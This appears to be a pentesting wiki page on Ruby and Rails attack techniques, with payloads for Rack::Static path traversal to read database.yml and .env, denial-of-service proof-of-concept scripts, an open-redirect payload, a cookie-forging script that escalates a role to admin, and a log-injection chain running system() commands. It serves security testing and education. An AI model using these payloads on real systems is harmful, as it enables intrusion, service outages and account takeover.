@@ -1,0 +1,218 @@
+# Ruby Tricks
+
+## File upload to RCE
+
+As explained in [this article](https://www.offsec.com/blog/cve-2024-46986/), uploading a `.rb` file into sensitive directories such as `config/initializers/` can lead to remote code execution (RCE) in Ruby on Rails applications.
+
+Tips:
+- Other boot/eager-load locations that are executed on app start are also risky when writeable (e.g., `config/initializers/` is the classic one). If you find an arbitrary file upload that lands anywhere under `config/` and is later evaluated/required, you may obtain RCE at boot.
+- Look for dev/staging builds that copy user-controlled files into the container image where Rails will load them on boot.
+
+## Active Storage image transformation → command execution (CVE-2025-24293)
+
+When an application uses Active Storage with `image_processing` + `mini_magick`, and passes untrusted parameters to image transformation methods, Rails versions prior to 7.1.5.2 / 7.2.2.2 / 8.0.2.1 could allow command injection because some transformation methods were mistakenly allowed by default.
+
+- A vulnerable pattern looks like:
+  ```erb
+  <%= image_tag blob.variant(params[:t] => params[:v]) %>
+  ```
+  where `params[:t]` and/or `params[:v]` are attacker-controlled.
+
+- What to try during testing
+  - Identify any endpoints that accept variant/processing options, transformation names, or arbitrary ImageMagick arguments.
+  - Fuzz `params[:t]` and `params[:v]` for suspicious errors or execution side-effects. If you can influence the method name or pass raw arguments that reach MiniMagick, you may get code exec on the image processor host.
+  - If you only have read-access to generated variants, attempt blind exfiltration via crafted ImageMagick operations.
+
+- Remediation/detections
+  - If you see Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 with Active Storage + `image_processing` + `mini_magick` and user-controlled transformations, consider it exploitable. Recommend upgrading and enforcing strict allowlists for methods/params and a hardened ImageMagick policy.
+
+## Rack::Static LFI / path traversal (CVE-2025-27610)
+
+If the target stack uses Rack middleware directly or via frameworks, versions of `rack` prior to 2.2.13, 3.0.14, and 3.1.12 allow Local File Inclusion via `Rack::Static` when `:root` is unset/misconfigured. Encoded traversal in `PATH_INFO` can expose files under the process working directory or an unexpected root.
+
+- Hunt for apps that mount `Rack::Static` in `config.ru` or middleware stacks. Try encoded traversals against static paths, for example:
+  ```text
+  GET /assets/%2e%2e/%2e%2e/config/database.yml
+  GET /favicon.ico/..%2f..%2f.env
+  ```
+  Adjust the prefix to match configured `urls:`. If the app responds with file contents, you likely have LFI to anything under the resolved `:root`.
+
+- Mitigation: upgrade Rack; ensure `:root` only points to a directory of public files and is explicitly set.
+
+## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)
+
+Rack < `3.0.9.1` and < `2.2.8.1` spent super-linear time parsing crafted `Content-Type: multipart/form-data` headers. A single POST with a gigantic `A=` parameter list can peg a Puma/Unicorn worker and cause DoS or request queue starvation.
+
+- Quick PoC (will hang one worker):
+  ```bash
+  python - <<'PY'
+import requests
+h = {'Content-Type': 'multipart/form-data; ' + 'A='*5000}
+requests.post('http://target/', data='x', headers=h)
+PY
+  ```
+- Works against any Rack-based stack (Rails/Sinatra/Hanami/Grape). If fronted by nginx/haproxy with keep-alive, repeat in parallel to exhaust workers.
+- Patched by making parser linear; look for `rack` gem version < `3.0.9.1` or < `2.2.8.1`. In assessments, point out that WAFs rarely block this because the header is syntactically valid.
+
+## REXML XML parser ReDoS (CVE-2024-49761)
+
+The REXML gem < 3.3.9 (Ruby 3.1 and earlier) catastrophically backtracks when parsing hex numeric character references containing long digit runs (e.g., `&#1111111111111x41;`). Any XML processed by REXML or libraries that wrap it (SOAP/XML API clients, SAML, SVG uploads) can be abused for CPU exhaustion.
+
+Minimal trigger against a Rails endpoint that parses XML:
+```bash
+curl -X POST http://target/xml -H 'Content-Type: application/xml' \
+  --data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
+```
+If the process stays busy for seconds and worker CPU spikes, it is likely vulnerable. Attack is low bandwidth and affects background jobs that ingest XML as well.
+
+## CGI cookie parsing / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)
+
+Apps using the `cgi` gem (default in many Rack stacks) can be frozen with a single malicious header:
+- `CGI::Cookie.parse` was super-linear; huge cookie strings (thousands of delimiters) trigger O(N²) behavior.
+- `CGI::Util#escapeElement` regex allowed ReDoS on HTML escaping.
+
+Both issues are fixed in `cgi` 0.3.5.1 / 0.3.7 / 0.4.2. For pentests, drop a massive `Cookie:` header or feed untrusted HTML to helper code and watch for worker lockup. Combine with keep-alive to amplify.
+
+## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)
+
+The `googlesign_in` gem < 1.3.0 (used for Google OAuth on Rails) performed an incomplete same-origin check on the `proceedto` parameter. A malformed URL like `proceedto=//attacker.com/%2F..` bypasses the check and redirects the user off-site while preserving Rails flash/session cookies.
+
+Exploit flow:
+1. Victim clicks crafted Google Sign-In link hosted by attacker.
+2. After authentication, the gem redirects to attacker-controlled domain, leaking flash notices or any data stored in cookies scoped to the wildcard domain.
+3. If the app stores short-lived tokens or magic links in flash, this can be turned into account takeover.
+
+During testing, grep Gemfile.lock for `googlesign_in` < 1.3.0 and try malformed `proceedto` values. Confirm via Location header and cookie reflection.
+
+## Forging/decrypting Rails cookies when `secret_key_base` is leaked
+
+Rails encrypts and signs cookies using keys derived from `secret_key_base`. If that value leaks (e.g., in a repo, logs, or misconfigured credentials), you can usually decrypt, modify, and re-encrypt cookies. This often leads to authz bypass if the app stores roles, user IDs, or feature flags in cookies.
+
+Minimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default in recent Rails):
+
+<details>
+<summary>Ruby to decrypt/forge cookies</summary>
+
+```ruby
+require 'cgi'
+require 'json'
+require 'active_support'
+require 'active_support/message_encryptor'
+require 'active_support/key_generator'
+
+secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
+raw_cookie = CGI.unescape(ARGV[0])
+
+salt   = 'authenticated encrypted cookie'
+cipher = 'aes-256-gcm'
+key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
+secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
+enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)
+
+plain = enc.decrypt_and_verify(raw_cookie)
+puts "Decrypted: #{plain.inspect}"
+
+# Modify and re-encrypt (example: escalate role)
+plain['role'] = 'admin' if plain.is_a?(Hash)
+forged = enc.encrypt_and_sign(plain)
+puts "Forged cookie: #{CGI.escape(forged)}"
+```
+
+</details>
+Notes:
+- Older apps may use AES-256-CBC and salts `encrypted cookie` / `signed encrypted cookie`, or JSON/Marshal serializers. Adjust salts, cipher, and serializer accordingly.
+- On compromise/assessment, rotate `secret_key_base` to invalidate all existing cookies.
+
+## See also (Ruby/Rails-specific vulns)
+
+- Ruby deserialization and class pollution:
+  
+  
+  
+- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
+  
+
+## Log Injection → RCE via Ruby `load` and `Pathname.cleanpath` smuggling
+
+When an app (often a simple Rack/Sinatra/Rails endpoint) both:
+- logs a user-controlled string verbatim, and
+- later `load`s a file whose path is derived from that same string (after `Pathname#cleanpath`),
+
+You can often achieve remote code execution by poisoning the log and then coercing the app to `load` the log file. Key primitives:
+
+- Ruby `load` evaluates the target file content as Ruby regardless of file extension. Any readable text file whose contents parse as Ruby will be executed.
+- `Pathname#cleanpath` collapses `.` and `..` segments without hitting the filesystem, enabling path smuggling: attacker-controlled junk can be prepended for logging while the cleaned path still resolves to the intended file to execute (e.g., `../logs/error.log`).
+
+### Minimal vulnerable pattern
+
+```ruby
+require 'logger'
+require 'pathname'
+
+logger   = Logger.new('logs/error.log')
+param    = CGI.unescape(params[:script])
+path_obj = Pathname.new(param)
+
+logger.info("Running backup script #{param}")            # Raw log of user input
+load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
+```
+
+### Why the log can contain valid Ruby
+`Logger` writes prefix lines like:
+```
+I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
+```
+In Ruby, `#` starts a comment and `9/2/2025` is just arithmetic. To inject valid Ruby code you need to:
+- Begin your payload on a new line so it is not commented out by the `#` in the INFO line; send a leading newline (`\n` or `%0A`).
+- Close the dangling `[` introduced by the INFO line. A common trick is to start with `]` and optionally make the parser happy with `][0]=1`.
+- Then place arbitrary Ruby (e.g., `system(...)`).
+
+Example of what will end up in the log after one request with a crafted param:
+```
+I, [9/2/2025 #209384]  INFO -- : Running backup script
+][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
+```
+
+### Smuggling a single string that both logs code and resolves to the log path
+We want one attacker-controlled string that:
+- when logged raw, contains our Ruby payload, and
+- when passed through `Pathname.new(<input>).cleanpath`, resolves to `../logs/error.log` so the subsequent `load` executes the just-poisoned log file.
+
+`Pathname#cleanpath` ignores schemes and collapses traversal components, so the following works:
+```ruby
+require 'pathname'
+
+p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
+puts p.cleanpath   # => ../logs/error.log
+```
+- The `#` before `://` ensures Ruby ignores the tail when the log is executed, while `cleanpath` still reduces the suffix to `../logs/error.log`.
+- The leading newline breaks out of the INFO line; `]` closes the dangling bracket; `][0]=1` satisfies the parser.
+
+### End-to-end exploitation
+1. Send the following as the backup script name (URL-encode the first newline as `%0A` if needed):
+   ```
+   \n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
+   ```
+2. The app logs your raw string into `logs/error.log`.
+3. The app computes `cleanpath` which resolves to `../logs/error.log` and calls `load` on it.
+4. Ruby executes the code you injected in the log.
+
+To exfiltrate a file in a CTF-like environment:
+```
+\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
+```
+URL-encoded PoC (first char is a newline):
+```
+%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
+```
+
+## References
+
+- [Rails Security Announcement: CVE-2025-24293 Active Storage unsafe transformation methods (fixed in 7.1.5.2 / 7.2.2.2 / 8.0.2.1)](https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670)
+- [GitHub Advisory: Rack::Static Local File Inclusion (CVE-2025-27610)](https://github.com/advisories/GHSA-7wqh-767x-r66v)
+- [Hardware Monitor Dojo-CTF #44: Log Injection to Ruby RCE (YesWeHack Dojo)](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-44)
+- [Ruby Pathname.cleanpath docs](https://docs.ruby-lang.org/en/3.4/Pathname.html#method-i-cleanpath)
+- [Ruby Logger](https://ruby-doc.org/stdlib-2.5.1/libdoc/logger/rdoc/Logger.html)
+- [How Ruby load works](https://blog.appsignal.com/2023/04/19/how-to-load-code-in-ruby.html)
+- [Rack multipart ReDoS advisory (CVE-2024-25126)](https://www.cve.news/cve-2024-25126/)
+- [Ruby security advisories for CGI / URI (CVE-2025-27219/27220/27221)](https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/)
